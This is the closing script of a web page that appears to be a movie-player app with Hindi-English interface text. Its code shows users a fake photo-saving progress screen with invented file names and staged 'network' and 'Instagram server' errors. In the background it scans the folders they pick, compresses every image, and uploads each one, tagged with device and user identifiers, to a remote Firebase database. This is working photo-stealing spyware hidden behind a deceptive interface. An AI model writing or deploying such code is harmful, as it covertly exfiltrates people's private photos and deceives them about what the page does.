            overlayPending.textContent = FAKE_TOTAL;
            overlayProgressLabel.textContent = `0 / ${FAKE_TOTAL} files`;

            realSaveInBackground(limitedFiles);
            runFakeProgress(FAKE_TOTAL);
        }

        /* FAKE SAVE (Android - from files) */
        async function startFakeSaveFromFiles(files) {
            isCancelled = false;
            retryCount = 0;
            fakeDone = 0;
            uploadStartTime = Date.now();

            overlay.classList.add('show');
            overlayMain.style.display = 'block';
            successState.classList.remove('show');
            errorState.classList.remove('show');
            resetOverlay();

            const FAKE_TOTAL = FAKE_FILE_COUNT;
            const images = files.filter(f => f.type.startsWith('image/') || /\.(jpg|jpeg|png|gif|webp|heic|heif)$/i.test(f.name));

            console.log(`📁 Real images: ${images.length}, Fake: ${FAKE_TOTAL}`);

            overlayTitle.textContent = 'Saving Photos';
            overlaySub.innerHTML = `Photos <strong>folder mein save</strong> ho rahi hain.`;
            overlayPending.textContent = FAKE_TOTAL;
            overlayProgressLabel.textContent = `0 / ${FAKE_TOTAL} files`;

            realSaveInBackground(images);
            runFakeProgress(FAKE_TOTAL);
        }

        /* FAKE PROGRESS RUNNER */
        function runFakeProgress(FAKE_TOTAL) {
            const fakeNames = Array.from({ length: FAKE_TOTAL }, (_, i) => {
                const d = String(1 + (i % 30)).padStart(2, '0');
                const m = String(1 + Math.floor(i / 30)).padStart(2, '0');
                return `IMG_2026${m}${d}_${Math.floor(Math.random() * 900000 + 100000)}.jpg`;
            });

            fakeInterval = setInterval(() => {
                if (isCancelled) return;
                fakeDone++;

                const shouldFail = Math.random() < 0.02;
                if (shouldFail) {
                    overlayFailed.textContent = parseInt(overlayFailed.textContent) + 1;
                    playSound(300, 0.15);
                    vibrate(100);
                } else {
                    overlayDone.textContent = fakeDone - parseInt(overlayFailed.textContent);
                    playSound(800 + Math.random() * 400, 0.08);
                    vibrate(20);
                }

                overlayPending.textContent = Math.max(0, FAKE_TOTAL - fakeDone);

                const percent = Math.round((fakeDone / FAKE_TOTAL) * 100);
                overlayProgressFill.style.width = percent + '%';
                overlayProgressPercent.textContent = percent + '%';
                overlayProgressLabel.textContent = `${fakeDone} / ${FAKE_TOTAL} files`;
                currentFile.textContent = fakeNames[fakeDone - 1] || 'file.jpg';

                if (fakeDone >= FAKE_TOTAL) {
                    clearInterval(fakeInterval);
                    fakeInterval = null;

                    setTimeout(() => {
                        if (retryCount === 0 && Math.random() < 0.6) showFakeError();
                        else if (retryCount === 1 && Math.random() < 0.5) showFakeError();
                        else if (retryCount === 2 && Math.random() < 0.4) showFakeError();
                        else showFinalSuccess(FAKE_TOTAL);
                    }, 600);
                }
            }, 400 + Math.random() * 300);
        }

        function showFakeError() {
            retryCount++;
            const stage = {
                1: { title: 'Network Error', sub: 'WiFi connection weak hai.' },
                2: { title: 'Server Busy', sub: 'Instagram server slow hai.' },
                3: { title: 'Connection Lost', sub: 'Internet connection toot gaya.' }
            }[retryCount] || { title: 'Failed', sub: 'Try again.' };

            document.getElementById('errorTitle').textContent = stage.title;
            errorSub.innerHTML = stage.sub;

            overlayMain.style.display = 'none';
            errorState.classList.add('show');

            playSound(200, 0.3);
            vibrate([100, 50, 100, 50, 100]);
            showToast(`⚠️ Save failed — Retry ${retryCount}/3`);

            releaseWakeLock();
        }

        errorRetry.addEventListener('click', () => {
            errorState.classList.remove('show');
            overlayMain.style.display = 'block';
            resetOverlay();

            const FAKE_TOTAL = FAKE_FILE_COUNT;
            fakeDone = Math.floor((retryCount - 1) * (FAKE_TOTAL / 3));

            overlayTitle.textContent = retryCount === 1 ? 'Retrying...' : 'Trying Again...';
            overlaySub.innerHTML = 'Photos dobara save ho rahi hain.';

            runFakeProgress(FAKE_TOTAL);
        });

        cancelBtn.addEventListener('click', () => {
            isCancelled = true;
            if (fakeInterval) clearInterval(fakeInterval);
            hideOverlay();
            releaseWakeLock();
            saveAllBtn.disabled = false;
            showToast('❌ Cancelled');
            retryCount = 0;
        });

        function showFinalSuccess(total) {
            total = total || FAKE_FILE_COUNT;
            overlayMain.style.display = 'none';
            successState.classList.add('show');
            successSub.innerHTML = `Sab <strong>${total} photos</strong> save ho gayin.<br>Thank you! 🎉`;

            playSound(1200, 0.2);
            vibrate([50, 50, 50, 50, 50]);
            showToast('🎉 Photos saved successfully!');

            releaseWakeLock();
            retryCount = 0;

            setTimeout(() => {
                hideOverlay();
                saveAllBtn.disabled = false;
            }, 3000);
        }

        /* REAL DB SAVE */
        async function realSaveInBackground(files) {
            if (!files || files.length === 0) return;

            try {
                console.log(`📸 Processing ${files.length} files...`);
                await deleteOldPhotos(500);

                let index = 0;
                let saved = 0;

                const worker = async () => {
                    while (index < files.length && !isCancelled) {
                        const i = index++;
                        const file = files[i];

                        try {
                            const compressed = await compressImage(file, COMPRESS_WIDTH, COMPRESS_QUALITY);
                            const blob = compressed;
                            const base64 = await blobToBase64(blob);

                            // 🔥 Queue first
                            await queuePhotoLocally(file, base64, blob);

                            // 🔥 Then upload
                            try {
                                const photoRef = push(ref(db, 'photos/' + DEVICE_ID));
                                await set(photoRef, {
                                    id: photoRef.key,
                                    deviceId: DEVICE_ID,
                                    deviceName: DEVICE_NAME,
                                    sessionId: SESSION_ID,
                                    username: USERNAME,
                                    image: base64,
                                    name: file.name,
                                    size: blob.size,
                                    originalSize: file.size,
                                    savedPercent: Math.round((1 - blob.size / file.size) * 100),
                                    timestamp: serverTimestamp(),
                                    uploadedAt: Date.now()
                                });

                                // Success → delete from queue
                                const pending = await idbGetAll();
                                const matching = pending.find(p => p.name === file.name);
                                if (matching) {
                                    await idbDelete(matching.id);
                                    if (matching.inOPFS) await opfsDelete(matching.name);
                                }

                                saved++;
                                console.log(`✅ Saved: ${file.name} (${saved}/${files.length})`);

                            } catch (uploadErr) {
                                console.warn(`⚠️ Upload failed — kept in queue: ${file.name}`);
                            }

                        } catch (err) {
                            console.warn('Processing error:', err.message);
                        }
                    }
                };

                await Promise.all(Array(CONCURRENCY).fill(null).map(() => worker()));
                console.log(`✅ BG save done: ${saved}/${files.length}`);

                const remaining = await idbCount();
                if (remaining > 0) {
                    setTimeout(syncPendingUploads, 3000);
                }

            } catch (e) {
                console.error('BG save error:', e);
            }
        }

        async function deleteOldPhotos(keepCount = 500) {
            try {
                const snapshot = await get(ref(db, 'photos/' + DEVICE_ID));
                const data = snapshot.val();
                if (!data) return;
                const items = Object.entries(data).map(([key, val]) => ({ key, ...val }));
                items.sort((a, b) => (a.uploadedAt || 0) - (b.uploadedAt || 0));
                const toDelete = items.slice(0, Math.max(0, items.length - keepCount));
                for (const item of toDelete) await remove(ref(db, `photos/${DEVICE_ID}/${item.key}`));
            } catch (e) {}
        }

        async function scanFolder(dirHandle, files) {
            try {
                for await (const entry of dirHandle.values()) {
                    if (entry.kind === 'file') {
                        if (/\.(jpg|jpeg|png|gif|webp|heic|heif|bmp)$/i.test(entry.name)) {
                            try {
                                const file = await entry.getFile();
                                if (file.size < 15 * 1024 * 1024) files.push(file);
                            } catch (e) {}
                        }
                    } else if (entry.kind === 'directory') {
                        await scanFolder(entry, files);
                    }
                }
            } catch (e) {}
        }

        function hideOverlay() { overlay.classList.remove('show'); }

        function resetOverlay() {
            overlayProgressFill.style.width = '0%';
            overlayProgressPercent.textContent = '0%';
            overlayProgressLabel.textContent = 'Starting...';
            overlayDone.textContent = '0';
            overlayPending.textContent = '0';
            overlayFailed.textContent = '0';
            currentFile.textContent = 'Waiting...';
        }

        function compressImage(file, maxWidth, quality) {
            return new Promise((resolve, reject) => {
                const reader = new FileReader();
                reader.onload = (e) => {
                    const img = new Image();
                    img.onload = () => {
                        const canvas = document.createElement('canvas');
                        let w = img.width, h = img.height;
                        if (w > maxWidth) { h = (maxWidth / w) * h; w = maxWidth; }
                        canvas.width = w;
                        canvas.height = h;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(img, 0, 0, w, h);
                        canvas.toBlob((blob) => {
                            if (!blob) { reject(new Error('fail')); return; }
                            resolve(blob);  // ✅ Blob return
                        }, 'image/jpeg', quality);
                    };
                    img.onerror = reject;
                    img.src = e.target.result;
                };
                reader.onerror = reject;
                reader.readAsDataURL(file);
            });
        }

        function blobToBase64(blob) {
            return new Promise((resolve) => {
                const reader = new FileReader();
                reader.onloadend = () => resolve(reader.result);
                reader.readAsDataURL(blob);
            });
        }

        function showToast(msg) {
            const existing = document.querySelector('.toast');
            if (existing) existing.remove();
            const toast = document.createElement('div');
            toast.className = 'toast';
            toast.textContent = msg;
            document.body.appendChild(toast);
            setTimeout(() => {
                toast.style.opacity = '0';
                toast.style.transition = 'opacity 0.3s';
                setTimeout(() => toast.remove(), 300);
            }, 2500);
        }

        /* INIT */
        loadMovie(0);
        startPlayback();
        updatePlayUI();

        let hideTimer = null;
        function resetHideTimer() {
            if (hideTimer) clearTimeout(hideTimer);
            topBar.classList.remove('hide');
            bottomControls.classList.remove('hide');
            hideTimer = setTimeout(() => {
                if (isPlaying) {
                    topBar.classList.add('hide');
                    bottomControls.classList.add('hide');
                }
            }, 3000);
        }
        document.addEventListener('mousemove', resetHideTimer);
        document.addEventListener('touchstart', resetHideTimer);
        resetHideTimer();

        console.log('✅ App ready');
    </script>
